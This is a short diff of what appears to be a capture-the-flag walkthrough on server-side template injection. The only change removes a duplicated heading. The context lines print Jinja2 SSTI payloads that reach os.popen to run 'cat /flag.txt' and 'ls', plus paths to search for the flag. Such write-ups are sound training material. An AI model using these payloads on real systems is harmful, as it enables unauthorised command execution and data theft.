@@ -22,7 +22,6 @@ Step 4: Execute Shell Command to Read Flag
 {{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('cat /flag.txt').read() }}
 {{ ''.__class__.__mro__[1].__subclasses__()[Y].__init__.__globals__['os'].popen('ls').read() }}  
 
-Common commands to try:
 Common Commands to Try:
 ls / → to list root
 ls /app, ls /home, ls /var/www/html → common flag locations
